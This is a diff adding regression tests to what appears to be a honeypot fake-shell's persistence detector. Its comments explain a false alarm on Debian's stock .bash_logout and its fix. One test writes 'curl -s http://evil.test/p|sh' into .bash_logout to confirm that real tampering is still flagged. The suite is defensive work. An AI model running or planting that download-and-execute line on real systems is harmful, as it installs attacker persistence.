@@ -269,6 +269,62 @@ def main():
             disagree.append((path, len(was), len(now)))
     check("baseline agrees with read() for every entry", disagree, [])
 
+    # The other half of that invariant, and the one it did not cover: every
+    # startup file the DETECTOR looks for, that the image actually ships,
+    # has to be in the baseline. It was not. The baseline was a list
+    # written out by hand and the detector had its own list, and
+    # .bash_logout was in the detector's only -- so it was "absent from
+    # the baseline and present on disk", which is the definition the
+    # detector uses for a file an attacker dropped.
+    #
+    # Every login shell therefore reported Debian's stock 220-byte
+    # .bash_logout as persistence. It fired during a real session on
+    # 2026-09-03 -- one that was installing a systemd user unit at the
+    # time -- so the false event competed with the true one for attention.
+    v = F.VFS()
+    # Named here rather than imported from fakeshell: these are the files
+    # bash reads, which is a fact about bash, and a suite that borrows the
+    # implementation's own list cannot notice the list being wrong. It
+    # also means this file runs against a tree that predates the shared
+    # constant instead of dying with an AttributeError -- one raising
+    # check takes every check below it along.
+    STARTUP = (".bashrc", ".profile", ".bash_profile", ".bash_login",
+               ".bash_logout")
+    unlisted = [h + "/" + nm
+                for h in ("/root", "/home/deploy")
+                for nm in STARTUP
+                if v.exists(h + "/" + nm)
+                and (h + "/" + nm) not in getattr(v, "startup_baseline", {})]
+    check("every shipped startup file is in the baseline", unlisted, [])
+
+    # and the consequence, stated as behaviour: a clean login is silent.
+    # As deploy, not root: only deploy's .bash_logout is seeded, so this
+    # check ran green against the bug when it ran as root -- a check that
+    # passes for the wrong reason is worse than no check.
+    v = F.VFS()
+    s2 = sh(v)
+    s2.user = "deploy"
+    s2.vars["HOME"] = "/home/deploy"
+    evs = events(s2)
+    s2.run_startup_files(login=True)
+    check("a clean login reports no persistence at all", persist(evs), [])
+    check("...and specifically not .bash_logout",
+          [e for e in persist(evs) if ".bash_logout" in (e.get("path") or "")],
+          [])
+
+    # A .bash_logout the attacker really did write still reports, so the
+    # fix is a baseline fix and not a blanket exemption.
+    v = F.VFS()
+    sh(v).run("echo 'curl -s http://evil.test/p|sh' >> /home/deploy/.bash_logout")
+    s2 = sh(v)
+    s2.vars["HOME"] = "/home/deploy"
+    evs = events(s2)
+    s2.run_startup_files(login=True)
+    p = persist(evs)
+    check("an edited .bash_logout is still reported", len(p) >= 1, True)
+    check("...and names the file",
+          any(".bash_logout" in (e.get("path") or "") for e in p), True)
+
     # And the symlinked file specifically, named, so a regression says which.
     link = "/etc/profile.d/70-systemd-shell-extra.sh"
     if link in v.nodes:
